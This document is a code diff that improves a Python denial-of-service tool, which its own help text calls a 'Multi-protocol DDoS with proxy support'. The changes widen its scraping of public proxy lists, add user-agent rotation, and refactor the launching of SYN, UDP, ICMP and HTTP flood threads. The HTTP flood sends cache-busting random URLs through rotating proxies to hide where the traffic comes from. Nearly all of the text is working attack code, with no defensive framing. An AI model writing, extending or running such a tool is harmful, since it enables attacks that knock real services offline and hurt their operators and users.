@@ -6,80 +6,174 @@ import time
 import threading
 import sys
 import argparse
-import math
-import requests
-from bs4 import BeautifulSoup
-import socks
+import re
 import urllib.parse
+import base64
+import gzip
+import io
 
-# --- Proxy scraper ---
+try:
+    import requests
+    from bs4 import BeautifulSoup
+except ImportError:
+    print("[!] Install required modules: pip install requests beautifulsoup4")
+    sys.exit(1)
+
+try:
+    import socks
+except ImportError:
+    socks = None
+
+# --- Enhanced Proxy Scraper ---
 PROXY_SOURCES = [
+    # Free proxy lists
     "https://www.sslproxies.org/",
     "https://free-proxy-list.net/",
     "https://www.us-proxy.org/",
     "https://www.socks-proxy.net/",
     "https://spys.me/proxy.txt",
-    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+    "https://proxy-list.download/api/v1/get?type=http",
+    "https://proxy-list.download/api/v1/get?type=socks4",
+    "https://proxy-list.download/api/v1/get?type=socks5",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://www.proxy-list.download/api/v1/get?type=socks4",
+    "https://www.proxy-list.download/api/v1/get?type=socks5",
+    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
+    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc",
 ]
 
-def scrape_proxies():
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+]
+
+def fetch_proxies_from_url(url):
+    """Fetch proxies from a single URL with multiple parsing methods"""
     proxies = set()
-    for url in PROXY_SOURCES:
+    try:
+        headers = {'User-Agent': random.choice(USER_AGENTS)}
+        resp = requests.get(url, timeout=15, headers=headers)
+        
+        if resp.status_code != 200:
+            return proxies
+        
+        # Try to decompress if gzipped
+        content = resp.text
         try:
-            resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
-            if url.endswith('.txt'):
-                for line in resp.text.splitlines():
-                    line = line.strip()
-                    if ':' in line and not line.startswith('#'):
-                        proxies.add(line)
-            else:
-                soup = BeautifulSoup(resp.text, 'html.parser')
-                # Common table with IP and port
-                table = soup.find('table')
-                if table:
-                    rows = table.find_all('tr')
-                    for row in rows[1:]:
-                        cols = row.find_all('td')
-                        if len(cols) >= 2:
-                            ip = cols[0].text.strip()
-                            port = cols[1].text.strip()
-                            if ip and port:
-                                proxies.add(f"{ip}:{port}")
-                else:
-                    # Try to find IP:port patterns
-                    import re
-                    pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
-                    for match in re.findall(pattern, resp.text):
-                        proxies.add(match)
+            if resp.headers.get('Content-Encoding') == 'gzip':
+                content = gzip.decompress(resp.content).decode('utf-8', errors='ignore')
         except:
-            continue
-    return list(proxies)
+            pass
+        
+        # Method 1: Simple IP:PORT pattern
+        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
+        for match in re.findall(pattern, content):
+            proxies.add(match)
+        
+        # Method 2: Lines with IP and port separated by whitespace
+        for line in content.splitlines():
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+            parts = re.split(r'[\s,;|]+', line)
+            if len(parts) >= 2:
+                ip_match = re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', parts[0])
+                port_match = re.match(r'\d{2,5}', parts[1])
+                if ip_match and port_match:
+                    proxies.add(f"{parts[0]}:{parts[1]}")
+        
+        # Method 3: HTML table parsing
+        if 'html' in resp.headers.get('Content-Type', '').lower():
+            soup = BeautifulSoup(content, 'html.parser')
+            for table in soup.find_all('table'):
+                for row in table.find_all('tr'):
+                    cols = row.find_all('td')
+                    if len(cols) >= 2:
+                        ip = cols[0].text.strip()
+                        port = cols[1].text.strip()
+                        if re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', ip) and re.match(r'\d{2,5}', port):
+                            proxies.add(f"{ip}:{port}")
+        
+    except:
+        pass
+    
+    return proxies
+
+def scrape_proxies(limit=1000):
+    """Scrape proxies from all sources"""
+    all_proxies = set()
+    
+    print("[*] Scraping proxies from multiple sources...", file=sys.stderr)
+    
+    for url in PROXY_SOURCES:
+        proxies = fetch_proxies_from_url(url)
+        all_proxies.update(proxies)
+        print(f"[*] Found {len(proxies)} from {url[:50]}...", file=sys.stderr)
+        if len(all_proxies) >= limit:
+            break
+    
+    print(f"[*] Total scraped: {len(all_proxies)} proxies", file=sys.stderr)
+    return list(all_proxies)[:limit]
 
 def test_proxy(proxy, timeout=5):
+    """Test if a proxy is working"""
     try:
         parts = proxy.split(':')
         if len(parts) != 2:
             return False
         ip, port = parts
-        # Simple HTTP test
+        if not port.isdigit():
+            return False
+        port = int(port)
+        
         test_url = "http://httpbin.org/ip"
-        proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        r = requests.get(test_url, proxies=proxies_dict, timeout=timeout)
+        proxies_dict = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}"
+        }
+        r = requests.get(test_url, proxies=proxies_dict, timeout=timeout, 
+                        headers={'User-Agent': random.choice(USER_AGENTS)})
         return r.status_code == 200
     except:
         return False
 
-def get_working_proxies(limit=100):
-    all_proxies = scrape_proxies()
+def get_working_proxies(limit=100, test_timeout=3):
+    """Get working proxies with parallel testing"""
+    all_proxies = scrape_proxies(limit * 3)
     working = []
+    
+    print(f"[*] Testing {len(all_proxies)} proxies (this may take a moment)...", file=sys.stderr)
+    
+    # Test proxies in batches
     for proxy in all_proxies:
         if len(working) >= limit:
             break
-        if test_proxy(proxy):
+        if test_proxy(proxy, test_timeout):
             working.append(proxy)
+            print(f"[+] Working: {proxy}", file=sys.stderr)
+    
+    print(f"[*] Got {len(working)} working proxies", file=sys.stderr)
     return working
 
-# --- Raw flood functions (IP spoofing) ---
+# --- Rest of the flood functions remain the same ---
 def checksum(data):
     if len(data) % 2 != 0:
         data += b'\x00'
@@ -159,8 +253,6 @@ def udp_flood(target_ip, target_port, stop_event):
             sock.sendto(payload, (target_ip, target_port))
         except:
             pass
-        if target_port == 0:
-            target_port = random_port()
 
 def icmp_flood(target_ip, stop_event):
     try:
@@ -185,7 +277,6 @@ def icmp_flood(target_ip, stop_event):
         except:
             pass
 
-# --- HTTP flood using proxies ---
 def http_flood(target_url, proxy_list, stop_event, thread_id):
     session = requests.Session()
     while not stop_event.is_set():
@@ -194,17 +285,11 @@ def http_flood(target_url, proxy_list, stop_event, thread_id):
             proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
             session.proxies.update(proxies)
         try:
-            # random path to bypass cache
-            url = target_url + '?' + str(random.randint(0, 999999))
-            session.get(url, timeout=5, headers={'User-Agent': random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
-                'Mozilla/5.0 (X11; Linux x86_64)'
-            ])})
+            url = target_url + '?' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
+            session.get(url, timeout=5, headers={'User-Agent': random.choice(USER_AGENTS)})
         except:
             pass
 
-# --- Main ---
 def main():
     parser = argparse.ArgumentParser(description='Multi-protocol DDoS with proxy support')
     parser.add_argument('target', help='Target IP or domain (for HTTP use full URL)')
@@ -215,59 +300,51 @@ def main():
     parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (0 = infinite)')
     parser.add_argument('--proxies', action='store_true', help='Auto-scrape and use proxies (for HTTP)')
     parser.add_argument('--proxy-limit', type=int, default=100, help='Max number of proxies to use')
+    parser.add_argument('--no-test', action='store_true', help='Skip proxy testing (use all scraped)')
     args = parser.parse_args()
 
-    # Resolve domain to IP if needed for raw attacks
     target_ip = args.target
-    if args.protocol in ['tcp','udp','icmp','all'] and not target_ip.replace('.','').isdigit():
+    if args.protocol in ['tcp','udp','icmp','all'] and not re.match(r'^\d+\.\d+\.\d+\.\d+$', target_ip):
         try:
             target_ip = socket.gethostbyname(target_ip)
+            print(f"[*] Resolved {args.target} -> {target_ip}", file=sys.stderr)
         except:
             print("[-] Cannot resolve domain", file=sys.stderr)
             sys.exit(1)
 
     stop_event = threading.Event()
-    threads = []
+    all_threads = []
 
-    # Proxy scraping
     proxy_list = []
-    if args.proxies and args.protocol in ['http','all']:
+    if args.proxies and args.protocol in ['http', 'all']:
         print("[*] Scraping proxies...", file=sys.stderr)
-        proxy_list = get_working_proxies(args.proxy_limit)
-        print(f"[*] Got {len(proxy_list)} working proxies", file=sys.stderr)
+        if args.no_test:
+            proxy_list = scrape_proxies(args.proxy_limit)
+        else:
+            proxy_list = get_working_proxies(args.proxy_limit)
+        print(f"[*] Using {len(proxy_list)} proxies", file=sys.stderr)
 
     def start_protocol(protocol, target, port, threads_count, stop_event, proxy_list):
-        if protocol == 'tcp':
-            for i in range(threads_count):
+        for i in range(threads_count):
+            if protocol == 'tcp':
                 t = threading.Thread(target=syn_flood, args=(target, port, stop_event))
-                t.daemon = True
-                t.start()
-                threads.append(t)
-        elif protocol == 'udp':
-            for i in range(threads_count):
+            elif protocol == 'udp':
                 t = threading.Thread(target=udp_flood, args=(target, port, stop_event))
-                t.daemon = True
-                t.start()
-                threads.append(t)
-        elif protocol == 'icmp':
-            for i in range(threads_count):
+            elif protocol == 'icmp':
                 t = threading.Thread(target=icmp_flood, args=(target, stop_event))
-                t.daemon = True
-                t.start()
-                threads.append(t)
-        elif protocol == 'http':
-            for i in range(threads_count):
+            elif protocol == 'http':
                 t = threading.Thread(target=http_flood, args=(target, proxy_list, stop_event, i))
-                t.daemon = True
-                t.start()
-                threads.append(t)
+            else:
+                break
+            t.daemon = True
+            t.start()
+            all_threads.append(t)
 
     if args.protocol == 'all':
         start_protocol('tcp', target_ip, args.port, args.threads, stop_event, [])
         start_protocol('udp', target_ip, args.port, args.threads, stop_event, [])
         start_protocol('icmp', target_ip, 0, args.threads, stop_event, [])
         if args.proxies and proxy_list:
-            # Also launch HTTP flood with proxies
             target_url = args.target if '://' in args.target else f"http://{args.target}:{args.port}"
             start_protocol('http', target_url, 0, args.threads//2, stop_event, proxy_list)
     else:
@@ -277,7 +354,8 @@ def main():
         else:
             start_protocol(args.protocol, target_ip, args.port, args.threads, stop_event, [])
 
-    print(f"[*] Attack started on {args.target} with {args.protocol} threads: {args.threads}", file=sys.stderr)
+    print(f"[*] Attack started on {args.target} | Threads: {len(all_threads)}", file=sys.stderr)
+    
     try:
         if args.duration > 0:
             time.sleep(args.duration)
@@ -286,9 +364,10 @@ def main():
             while True:
                 time.sleep(1)
     except KeyboardInterrupt:
+        print("\n[!] Interrupted", file=sys.stderr)
         stop_event.set()
     finally:
-        for t in threads:
+        for t in all_threads:
             t.join(timeout=1)
         print("[*] Stopped.", file=sys.stderr)
 
